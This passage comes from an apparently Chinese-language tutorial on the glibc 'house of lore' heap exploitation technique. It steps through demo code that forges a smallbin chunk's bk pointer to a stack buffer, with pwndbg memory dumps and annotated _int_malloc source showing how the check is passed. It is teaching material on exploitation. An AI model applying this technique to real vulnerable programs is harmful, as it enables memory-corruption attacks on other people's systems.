0x7ffff7dcdca0</span></span><br><span class="line"><span class="meta">#victim-&gt;bk: 0x7ffff7dcdca0</span></span><br><span class="line"></span><br><span class="line">#Now performing a <span class="built_in">malloc</span> that can<span class="number">&#x27;</span>t be handled by the UnsortedBin, nor the small bin</span><br><span class="line">#This means that the chunk <span class="number">0x555555757260</span> will be inserted in front of the SmallBin</span><br></pre></td></tr></table></figure><p>然后 malloc(1200)一个堆块，这个堆块的作用是将在 unsortedbin 中的 chunk_victim 移入到 smallbin 中（b 108-&gt;c）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">void</span> *p2 = <span class="built_in">malloc</span>(<span class="number">1200</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The chunk that can&#x27;t be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n&quot;</span>, p2);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The victim chunk has been sorted and its fwd and bk pointers updated\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;fwd: %p\n&quot;</span>, (<span class="keyword">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="keyword">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line">#The chunk that can<span class="number">&#x27;</span>t be handled by the unsorted bin, nor the SmallBin has been allocated to <span class="number">0x555555757ed0</span></span><br><span class="line">#The victim chunk has been sorted <span class="keyword">and</span> its fwd <span class="keyword">and</span> bk pointers updated</span><br><span class="line"><span class="meta">#victim-&gt;fwd: 0x7ffff7dcdda0</span></span><br><span class="line"><span class="meta">#victim-&gt;bk: 0x7ffff7dcdda0</span></span><br></pre></td></tr></table></figure><blockquote><p>如果这里不明白 malloc 之后 chunk_victim 移入到 smallbin 的原因，建议翻一下 malloc 源码，着重看_int_malloc 函数。</p></blockquote><p>此时的内存状况如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">650</span>gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000251</span> <span class="meta">#tcache</span></span><br><span class="line"><span class="number">0x555555757010</span>:<span class="number">0x0000000000000000</span><span class="number">0x0700000000000000</span></span><br><span class="line">.......</span><br><span class="line"><span class="number">0x5555557570c0</span>:<span class="number">0x0000000000000000</span><span class="number">0x00005555557579d0</span></span><br><span class="line">.......</span><br><span class="line"><span class="number">0x555555757250</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk_victim(<span class="built_in">free</span>-smallbin)</span><br><span class="line"><span class="number">0x555555757260</span>:<span class="number">0x00007ffff7dcdda0</span><span class="number">0x00007ffff7dcdda0</span></span><br><span class="line">#victim_chunk==<span class="number">0x555555757250</span></span><br><span class="line">.......</span><br><span class="line"><span class="number">0x555555757360</span>:<span class="number">0x0000000000000110</span><span class="number">0x0000000000000111</span> #chunk_dummy[<span class="number">0</span>](<span class="built_in">free</span>-tcachebin)</span><br><span class="line"><span class="number">0x555555757370</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000555555757010</span></span><br><span class="line">.......</span><br><span class="line"><span class="number">0x555555757470</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk_dummy[<span class="number">1</span>](<span class="built_in">free</span>-tcachebin)</span><br><span class="line"><span class="number">0x555555757480</span>:<span class="number">0x0000555555757370</span><span class="number">0x0000555555757010</span></span><br><span class="line">.......</span><br><span class="line"><span class="number">0x555555757580</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk_dummy[<span class="number">2</span>](<span class="built_in">free</span>-tcachebin)</span><br><span class="line"><span class="number">0x555555757590</span>:<span class="number">0x0000555555757480</span><span class="number">0x0000555555757010</span></span><br><span class="line">.......</span><br><span class="line"><span class="number">0x555555757690</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk_dummy[<span class="number">3</span>](<span class="built_in">free</span>-tcachebin)</span><br><span class="line"><span class="number">0x5555557576a0</span>:<span class="number">0x0000555555757590</span><span class="number">0x0000555555757010</span></span><br><span class="line">.......</span><br><span class="line"><span class="number">0x5555557577a0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk_dummy[<span class="number">4</span>](<span class="built_in">free</span>-tcachebin)</span><br><span class="line"><span class="number">0x5555557577b0</span>:<span class="number">0x00005555557576a0</span><span class="number">0x0000555555757010</span></span><br><span class="line">.......</span><br><span class="line"><span class="number">0x5555557578b0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk_dummy[<span class="number">5</span>](<span class="built_in">free</span>-tcachebin)</span><br><span class="line"><span class="number">0x5555557578c0</span>:<span class="number">0x00005555557577b0</span><span class="number">0x0000555555757010</span></span><br><span class="line">.......</span><br><span class="line"><span class="number">0x5555557579c0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk_dummy[<span class="number">6</span>](<span class="built_in">free</span>-tcachebin)</span><br><span class="line"><span class="number">0x5555557579d0</span>:<span class="number">0x00005555557578c0</span><span class="number">0x0000555555757010</span></span><br><span class="line">.......</span><br><span class="line"><span class="number">0x555555757ad0</span>:<span class="number">0x0000000000000000</span><span class="number">0x00000000000003f1</span> #large_chunk--<span class="built_in">malloc</span>(<span class="number">1000</span>)--p5</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757ec0</span>:<span class="number">0x0000000000000000</span><span class="number">0x00000000000004c1</span> #large_chunk--<span class="built_in">malloc</span>(<span class="number">1200</span>)--p2</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758380</span>:<span class="number">0x0000000000000000</span><span class="number">0x000000000001fc81</span> #top_chunk</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758440</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><h1 id=""><a href="#" class="headerlink" title=""></a><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1620987321869-bd5b3ea8-c109-4ac7-b20f-8941f4363e5b.png#clientId=u5bcede89-c135-4&from=drop&id=u1496db44&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-05-14%2018.15.17.png&originHeight=670&originWidth=2744&originalType=binary&size=96665&status=done&style=none&taskId=u0509978d-7fab-4c1c-a341-8465a141839" alt="截屏2021-05-14 18.15.17.png"></h1><p>假如说现在有个漏洞（如堆溢出或 UAF 之类的）可以修改 chunk_victim 的<strong>bk 指针</strong>（b 113-&gt;c）：</p><blockquote><p>这里我们将 bk 指针篡改到 stack_buffer_1</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">victim[<span class="number">1</span>] = (<span class="keyword">intptr_t</span>)stack_buffer_1; <span class="comment">// victim-&gt;bk is pointing to stack</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//------------------------------------</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">650</span>gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000251</span> <span class="meta">#tcache</span></span><br><span class="line"><span class="number">0x555555757010</span>:<span class="number">0x0000000000000000</span><span class="number">0x0700000000000000</span></span><br><span class="line">.......</span><br><span class="line"><span class="number">0x5555557570c0</span>:<span class="number">0x0000000000000000</span><span class="number">0x00005555557579d0</span></span><br><span class="line">.......</span><br><span class="line"><span class="number">0x555555757250</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk_victim(<span class="built_in">free</span>-smallbin)</span><br><span class="line"><span class="number">0x555555757260</span>:<span class="number">0x00007ffff7dcdda0</span><span class="number">0x00007fffffffdca0</span></span><br><span class="line">    <span class="meta">#changed</span></span><br><span class="line">#victim_chunk==<span class="number">0x555555757250</span></span><br><span class="line">.......</span><br><span class="line"><span class="number">0x555555757360</span>:<span class="number">0x0000000000000110</span><span class="number">0x0000000000000111</span> #chunk_dummy[<span class="number">0</span>](<span class="built_in">free</span>-tcachebin)</span><br><span class="line"><span class="number">0x555555757370</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000555555757010</span></span><br><span class="line">.......</span><br><span class="line"><span class="number">0x555555757470</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk_dummy[<span class="number">1</span>](<span class="built_in">free</span>-tcachebin)</span><br><span class="line"><span class="number">0x555555757480</span>:<span class="number">0x0000555555757370</span><span class="number">0x0000555555757010</span></span><br><span class="line">.......</span><br><span class="line"><span class="number">0x555555757580</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk_dummy[<span class="number">2</span>](<span class="built_in">free</span>-tcachebin)</span><br><span class="line"><span class="number">0x555555757590</span>:<span class="number">0x0000555555757480</span><span class="number">0x0000555555757010</span></span><br><span class="line">.......</span><br><span class="line"><span class="number">0x555555757690</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk_dummy[<span class="number">3</span>](<span class="built_in">free</span>-tcachebin)</span><br><span class="line"><span class="number">0x5555557576a0</span>:<span class="number">0x0000555555757590</span><span class="number">0x0000555555757010</span></span><br><span class="line">.......</span><br><span class="line"><span class="number">0x5555557577a0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk_dummy[<span class="number">4</span>](<span class="built_in">free</span>-tcachebin)</span><br><span class="line"><span class="number">0x5555557577b0</span>:<span class="number">0x00005555557576a0</span><span class="number">0x0000555555757010</span></span><br><span class="line">.......</span><br><span class="line"><span class="number">0x5555557578b0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk_dummy[<span class="number">5</span>](<span class="built_in">free</span>-tcachebin)</span><br><span class="line"><span class="number">0x5555557578c0</span>:<span class="number">0x00005555557577b0</span><span class="number">0x0000555555757010</span></span><br><span class="line">.......</span><br><span class="line"><span class="number">0x5555557579c0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk_dummy[<span class="number">6</span>](<span class="built_in">free</span>-tcachebin)</span><br><span class="line"><span class="number">0x5555557579d0</span>:<span class="number">0x00005555557578c0</span><span class="number">0x0000555555757010</span></span><br><span class="line">.......</span><br><span class="line"><span class="number">0x555555757ad0</span>:<span class="number">0x0000000000000000</span><span class="number">0x00000000000003f1</span> #large_chunk--<span class="built_in">malloc</span>(<span class="number">1000</span>)--p5</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757ec0</span>:<span class="number">0x0000000000000000</span><span class="number">0x00000000000004c1</span> #large_chunk--<span class="built_in">malloc</span>(<span class="number">1200</span>)--p2</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758380</span>:<span class="number">0x0000000000000000</span><span class="number">0x000000000001fc81</span> #top_chunk</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758440</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1621168960823-dd0276b0-5138-4187-be45-94785a74f7fd.png#clientId=u4f1cc8aa-dd3a-4&from=drop&id=uf02af31f&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-05-16%2020.42.32.png&originHeight=1800&originWidth=2880&originalType=binary&size=632922&status=done&style=none&taskId=ub034a99a-6e93-44b2-8b96-74ca2d9a6f4" alt="截屏2021-05-16 20.42.32.png"><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1620987646176-216f7ffe-d2ca-40a8-8d24-d4cec0bdaa79.png#clientId=u5bcede89-c135-4&from=drop&id=u37296420&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-05-14%2018.20.38.png&originHeight=742&originWidth=2752&originalType=binary&size=114035&status=done&style=none&taskId=uff7a00e9-fdcb-4e19-8041-247d3b4691d" alt="截屏2021-05-14 18.20.38.png"><br>如上图所示，现在 smallbin 的 0x110 链表出现了异常（corrupted），这里先不用管，我们先清空 tcachebin 再说（b 117-&gt;c）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now take all dummies chunk in tcache out\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1620987693974-4aa6e7b7-8e80-4f3d-9ba6-ce373a933808.png#clientId=u5bcede89-c135-4&from=drop&id=Hgkok&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-05-14%2018.21.27.png&originHeight=748&originWidth=2746&originalType=binary&size=101751&status=done&style=none&taskId=u4c22f5f5-26bb-4765-a048-f196fa73864" alt="截屏2021-05-14 18.21.27.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">650</span>gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000251</span> <span class="meta">#tcache</span></span><br><span class="line"><span class="number">0x555555757010</span>:<span class="number">0x0000000000000000</span><span class="number">0x0700000000000000</span></span><br><span class="line">.......</span><br><span class="line"><span class="number">0x5555557570c0</span>:<span class="number">0x0000000000000000</span><span class="number">0x00005555557579d0</span></span><br><span class="line">.......</span><br><span class="line"><span class="number">0x555555757250</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk_victim(<span class="built_in">free</span>-smallbin)</span><br><span class="line"><span class="number">0x555555757260</span>:<span class="number">0x00007ffff7dcdda0</span><span class="number">0x00007fffffffdca0</span> #（corrupted）</span><br><span class="line">#victim_chunk==<span class="number">0x555555757250</span></span><br><span class="line">.......</span><br><span class="line"><span class="number">0x555555757360</span>:<span class="number">0x0000000000000110</span><span class="number">0x0000000000000111</span> #chunk_dummy[<span class="number">0</span>](<span class="built_in">malloc</span>)</span><br><span class="line">.......</span><br><span class="line"><span class="number">0x555555757470</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk_dummy[<span class="number">1</span>](<span class="built_in">malloc</span>)</span><br><span class="line">.......</span><br><span class="line"><span class="number">0x555555757580</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk_dummy[<span class="number">2</span>](<span class="built_in">malloc</span>)</span><br><span class="line">.......</span><br><span class="line"><span class="number">0x555555757690</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk_dummy[<span class="number">3</span>](<span class="built_in">malloc</span>)</span><br><span class="line">.......</span><br><span class="line"><span class="number">0x5555557577a0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk_dummy[<span class="number">4</span>](<span class="built_in">malloc</span>)</span><br><span class="line">.......</span><br><span class="line"><span class="number">0x5555557578b0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk_dummy[<span class="number">5</span>](<span class="built_in">malloc</span>)</span><br><span class="line">.......</span><br><span class="line"><span class="number">0x5555557579c0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span> #chunk_dummy[<span class="number">6</span>](<span class="built_in">malloc</span>)</span><br><span class="line">.......</span><br><span class="line"><span class="number">0x555555757ad0</span>:<span class="number">0x0000000000000000</span><span class="number">0x00000000000003f1</span> #large_chunk--<span class="built_in">malloc</span>(<span class="number">1000</span>)--p5</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757ec0</span>:<span class="number">0x0000000000000000</span><span class="number">0x00000000000004c1</span> #large_chunk--<span class="built_in">malloc</span>(<span class="number">1200</span>)--p2</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758380</span>:<span class="number">0x0000000000000000</span><span class="number">0x000000000001fc81</span> #top_chunk</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758440</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>下述代码中的 malloc(0x100)是我们这篇文章中研究的重点，这里需要引入 malloc 源码进行调试：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now allocating a chunk with size equal to the first one freed\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br></pre></td></tr></table></figure><p>这里直接调试到_int_malloc 函数：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1621000082565-e81a4984-5bdf-4538-854a-95605d989e7c.png#clientId=u69bb3ca7-adbb-4&from=drop&id=u87aec9cc&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-05-14%2021.47.56.png&originHeight=1800&originWidth=2880&originalType=binary&size=513826&status=done&style=none&taskId=u4b6cd3f9-4460-4f6d-ad48-cbd3f340ce4" alt="截屏2021-05-14 21.47.56.png"><br>经过一些过程之后会来到：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1621001108176-a0765340-4cad-4485-80e3-cd4e82032e3f.png#clientId=u69bb3ca7-adbb-4&from=drop&id=uafe37ec2&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-05-14%2022.04.59.png&originHeight=1800&originWidth=2880&originalType=binary&size=553970&status=done&style=none&taskId=u20a2841b-fc8e-4af1-8725-f31584efd4c" alt="截屏2021-05-14 22.04.59.png"><br>我们这里再复习一下这里的 malloc，house of lore 的问题主要出现在这里：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If a small request, check regular bin.  Since these &quot;smallbins&quot;</span></span><br><span class="line"><span class="comment">     hold one size each, no searching within bins is necessary.</span></span><br><span class="line"><span class="comment">     (For a large request, we need to wait until unsorted chunks are</span></span><br><span class="line"><span class="comment">     processed to find best fit. But for small ones, fits are exact</span></span><br><span class="line"><span class="comment">     anyway, so we can check now, which is faster.)</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (in_smallbin_range (nb)) <span class="comment">//nb==0x110</span></span><br><span class="line">    &#123;</span><br><span class="line">      idx = smallbin_index (nb); <span class="comment">//idx==17</span></span><br><span class="line">      bin = bin_at (av, idx);  <span class="comment">//bin==0x7ffff7dcdda0</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((victim = last (bin)) != bin) <span class="comment">//检查smallbin中是否有符合大小的free chunk</span></span><br><span class="line">        &#123;  <span class="comment">//进入if语句:victim==0x555555757250</span></span><br><span class="line">          bck = victim-&gt;bk;  <span class="comment">//bck==0x7fffffffdca0（stack_buffer_1）</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim)) <span class="comment">//检查双向链表的完整性</span></span><br><span class="line">          <span class="comment">//bck-&gt;fd==0x555555757250</span></span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>); <span class="comment">//未触发异常</span></span><br><span class="line">===============================================================================================</span><br><span class="line">pwndbg&gt; smallbin</span><br><span class="line">smallbins</span><br><span class="line"><span class="number">0x110</span> [corrupted]</span><br><span class="line">FD: <span class="number">0x555555757250</span> —▸ <span class="number">0x7ffff7dcdda0</span> (main_arena+<span class="number">352</span>) ◂— <span class="number">0x555555757250</span> <span class="comment">/* &#x27;PruUUU&#x27; */</span></span><br><span class="line">BK: <span class="number">0x555555757250</span> —▸ <span class="number">0x7fffffffdca0</span> —▸ <span class="number">0x7fffffffdc80</span> —▸ <span class="number">0x7fffffffdd00</span> —▸ <span class="number">0x7fffffffdd20</span> ◂— ...</span><br><span class="line">pwndbg&gt;</span><br><span class="line">===============================================================================================</span><br><span class="line">          set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">          bin-&gt;bk = bck; <span class="comment">//对smallbin中的victim进行解链【1】</span></span><br><span class="line">          bck-&gt;fd = bin; <span class="comment">//对smallbin中的victim进行解链【2】</span></span><br><span class="line">-----------------------------------------------------------------------------------------------</span><br><span class="line">smallbins</span><br><span class="line"><span class="number">0x110</span> [corrupted]</span><br><span class="line">FD: <span class="number">0x555555757250</span> —▸ <span class="number">0x7ffff7dcdda0</span> (main_arena+<span class="number">352</span>) ◂— <span class="number">0x555555757250</span> <span class="comment">/* &#x27;PruUUU&#x27; */</span></span><br><span class="line">BK: <span class="number">0x7fffffffdca0</span> —▸ <span class="number">0x7fffffffdc80</span> —▸ <span class="number">0x7fffffffdd00</span> —▸ <span class="number">0x7fffffffdd20</span> —▸ <span class="number">0x7fffffffdd40</span> ◂— ...</span><br><span class="line">pwndbg&gt;</span><br><span class="line">-----------------------------------------------------------------------------------------------</span><br><span class="line">          <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">    set_non_main_arena (victim);</span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">     stash them in the tcache.  */</span></span><br><span class="line">          <span class="comment">//如果smallbin中的对应大小的链表中仍然有大小相同的free chunk</span></span><br><span class="line">          <span class="comment">//我们会将剩余的free chunk放入到对应的tcachebin链表中</span></span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (nb); <span class="comment">//tc_idx==15</span></span><br><span class="line">  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">    &#123;</span><br><span class="line">      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count <span class="comment">//检查对应大小的tcachebin链表是否未满</span></span><br><span class="line">     &amp;&amp; (tc_victim = last (bin)) != bin) <span class="comment">//检查对应大小的smallbin链表上是否仍有free chunk</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">    &#123; <span class="comment">//tc_victim==0x7fffffffdca0</span></span><br><span class="line">#现在的smallbin链表：</span><br><span class="line"><span class="meta">#smallbins</span></span><br><span class="line">#<span class="number">0x110</span> [corrupted]</span><br><span class="line">#FD: <span class="number">0x555555757250</span> —▸ <span class="number">0x7ffff7dcdda0</span> (main_arena+<span class="number">352</span>) ◂— <span class="number">0x555555757250</span> <span class="comment">/* &#x27;PruUUU&#x27; */</span></span><br><span class="line">#BK: <span class="number">0x7fffffffdca0</span> —▸ <span class="number">0x7fffffffdc80</span> —▸ <span class="number">0x7fffffffdd00</span> —▸ <span class="number">0x7fffffffdd20</span> —▸ <span class="number">0x7fffffffdd40</span> ◂— ...</span><br><span class="line">      bck = tc_victim-&gt;bk; <span class="comment">//bck==0x7fffffffdc80</span></span><br><span class="line">      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">set_non_main_arena (tc_victim);</span><br><span class="line">      bin-&gt;bk = bck; <span class="comment">//对tc_victim进行解链【1】</span></span><br><span class="line">      bck-&gt;fd = bin; <span class="comment">//对tc_victim进行解链【2】</span></span><br><span class="line"><span class="meta">#smallbins</span></span><br><span class="line">#<span class="number">0x110</span> [corrupted]</span><br><span class="line">#FD: <span class="number">0x555555757250</span> —▸ <span class="number">0x7ffff7dcdda0</span> (main_arena+<span class="number">352</span>) ◂— <span class="number">0x555555757250</span> <span 